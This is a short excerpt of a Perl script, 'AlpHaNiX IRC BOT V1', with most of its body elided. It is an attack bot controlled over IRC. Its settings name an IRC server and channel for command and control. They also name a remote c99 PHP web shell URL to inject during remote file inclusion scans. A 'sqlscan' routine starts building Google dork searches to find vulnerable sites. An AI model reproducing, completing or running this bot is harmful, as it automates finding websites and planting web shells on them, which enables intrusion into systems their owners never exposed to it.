...
use MIME::Base64;
############################################################################################
my $server   = "irc.adr3nalin3.com";   # IRC Server
my $port         = "6667";                               # IRC Server port
my $nick         = "sqli";                            # Bot Nick
my $channel  = "#chats";                  # Channel to Join
my $name         = "12542v dg sdfgcd sfdgfsrcgc";
my $phpshell = "http://w7ed.by.ru/c99.txt";  #your phpshell link for RFI scan
############################################################################################
system('cls');
print " \n\n                                                                                                    AlpHaNiX IRC BOT V1 \n\n";
...
sub sqlscan
{
        ...
        my $google   = "http://www.google.com/search&channel=fs&q=$dork&ie=utf-8&oe=utf-8";
        #----
